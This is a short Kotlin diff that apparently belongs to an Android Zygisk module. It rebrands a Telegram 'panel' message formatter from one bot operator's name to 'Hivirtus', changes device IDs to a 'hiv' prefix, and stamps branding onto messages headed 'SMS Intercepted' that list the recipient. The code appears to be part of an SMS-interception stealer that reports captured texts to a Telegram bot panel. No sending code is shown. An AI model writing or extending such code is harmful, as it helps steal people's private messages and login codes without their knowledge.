@@ -2,23 +2,26 @@ package com.hivirtus.zygiskmode
 
 import java.security.SecureRandom
 
-/**
- * @Gian_AutoToken_bot / GianPanel format compatibility.
- */
-object GianPanelCompat {
+/** Hivirtus panel / Telegram message format. */
+object HivirtusPanelFormat {
+
+    const val BRANDING = "Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥"
+    const val HANDLE = "@hivirtus @liqdy"
 
     private const val DEVICE_ID_LEN = 7
     private val ID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"
     private val random = SecureRandom()
 
-    /** Gian bot: "7 character wala" device ID — e.g. qc6gjfs */
-    fun generateDeviceId(): String =
-        (1..DEVICE_ID_LEN).map { ID_CHARS[random.nextInt(ID_CHARS.length)] }
-            .joinToString("")
+    /** 7-char ID — hivxxxx format */
+    fun generateDeviceId(): String {
+        val suffix = (1..4).map { ID_CHARS[random.nextInt(ID_CHARS.length)] }.joinToString("")
+        return "hiv$suffix"
+    }
 
-    fun isGianStyleId(id: String): Boolean {
-        val trimmed = id.trim()
-        return trimmed.length in 6..8 && trimmed.all { it.isLowerCase() || it.isDigit() }
+    fun isValidDeviceId(id: String): Boolean {
+        val trimmed = id.trim().lowercase()
+        return trimmed.length in 6..8 &&
+            (trimmed.startsWith("hiv") || trimmed.all { it.isLowerCase() || it.isDigit() })
     }
 
     fun formatDest(dest: String): String {
@@ -42,6 +45,7 @@ object GianPanelCompat {
         val smsBody = body.trim()
         return buildString {
             appendLine("📱 SMS Intercepted")
+            appendLine(BRANDING)
             appendLine("-----------------")
             appendLine("To:")
             appendLine(to)
